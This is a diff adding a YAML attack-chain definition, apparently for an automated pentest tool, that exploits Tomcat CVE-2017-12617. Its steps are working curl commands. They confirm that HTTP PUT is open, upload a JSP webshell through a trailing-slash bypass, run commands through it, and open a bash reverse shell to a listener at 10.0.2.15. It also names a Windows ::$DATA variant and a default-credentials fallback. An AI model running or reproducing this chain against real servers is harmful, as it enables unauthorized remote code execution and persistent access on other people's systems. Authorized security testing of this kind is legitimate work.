@@ -1,0 +1,64 @@
+chain_id: tomcat_put_cve_2017_12617
+title: "Tomcat — CVE-2017-12617 PUT JSP unauth RCE (readonly=false)"
+severity: CRITICAL
+tags: [tomcat, web, cve-2017-12617, put, jsp, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2017-12617" }
+    - { banner_pattern: "(?i)apache.*tomcat/(7\\.0\\.([0-7]?[0-9]|80)|8\\.[05]\\.|9\\.0\\.[0-1]?)" }
+    - { product_pattern: "(?i)apache\\s*tomcat" }
+
+description: |
+  Tomcat 7.0.0–7.0.79, 8.0.x, 8.5.x ≤ 8.5.22, 9.0.0.M1–9.0.0 with the
+  default servlet's `readonly` parameter set to `false` accept HTTP PUT
+  to drop arbitrary files. Tomcat blocks `.jsp` PUTs by name, but you
+  bypass it with a trailing `/` (or `::$DATA` on Windows) so the path
+  filter misses it but the file lands as `shell.jsp` on disk.
+
+steps:
+  - id: 1
+    title: "Confirm PUT is enabled (200 / 201 → vulnerable, 403/405 → not)"
+    command: |
+      curl -i -X OPTIONS "http://$VICTIMA:8080/"
+      curl -i -X PUT "http://$VICTIMA:8080/probe.txt" -d 'rootctl'
+      curl -i "http://$VICTIMA:8080/probe.txt"
+
+  - id: 2
+    title: "Drop the JSP webshell using the trailing-slash bypass"
+    command: |
+      curl -i -X PUT "http://$VICTIMA:8080/shell.jsp/" --data-binary @- <<'JSP'
+      <%@ page import="java.util.*,java.io.*"%>
+      <% String c=request.getParameter("c"); if(c!=null){
+         Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});
+         BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));
+         String l; while((l=r.readLine())!=null) out.println(l);} %>
+      JSP
+
+  - id: 3
+    title: "Execute commands"
+    command: |
+      curl "http://$VICTIMA:8080/shell.jsp?c=id"
+      curl "http://$VICTIMA:8080/shell.jsp?c=hostname"
+
+  - id: 4
+    title: "Reverse shell"
+    command: |
+      nc -lvnp 4444
+      curl "http://$VICTIMA:8080/shell.jsp" --data-urlencode \
+        'c=bash -c "bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"' -G
+
+common_errors:
+  - error: "PUT returns 403 / 405"
+    solution: |
+      `readonly=false` is not set on the default servlet — this exact
+      CVE does not apply. Fall back to the manager-app default-creds
+      chain (`tomcat_manager_default`).
+  - error: "PUT returns 204 / 201 but GET on shell.jsp is 404"
+    solution: |
+      Try the Windows-only variant: `PUT /shell.jsp::$DATA`. Some
+      8.5.x builds need that suffix instead of the trailing slash.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2017-12617
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
